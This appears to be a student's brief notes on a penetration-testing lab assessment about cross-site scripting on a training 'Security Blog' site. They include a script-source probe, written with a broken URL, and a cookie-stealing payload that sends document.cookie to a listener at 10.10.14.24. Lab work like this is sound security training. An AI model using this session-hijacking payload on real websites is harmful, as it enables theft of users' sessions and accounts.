# Skill Assessment

We are performing a Web Application Penetration Testing task for a company that hired you, which just released their new `Security Blog`. In our Web Application Penetration Testing plan, we reached the part where you must test the web application against Cross-Site Scripting vulnerabilities (XSS).

Start the server below, make sure you are connected to the VPN, and access the `/assessment` directory on the server using the browser.
Apply the skills you learned in this module to achieve the following:

1. Identify a user-input field that is vulnerable to an XSS vulnerability
2. Find a working XSS payload that executes JavaScript code on the target's browser
3. Using the `Session Hijacking` techniques, try to steal the victim's cookies, which should contain the flag


We tried the next XSS payload and it works in the website field:

```python
<script src=http//IP></script>
```

### Payload de robo de cookie

```php
<script>new Image().src="http://10.10.14.24/cookie.php?c="+document.cookie;</script>
```

Cookie is the flag.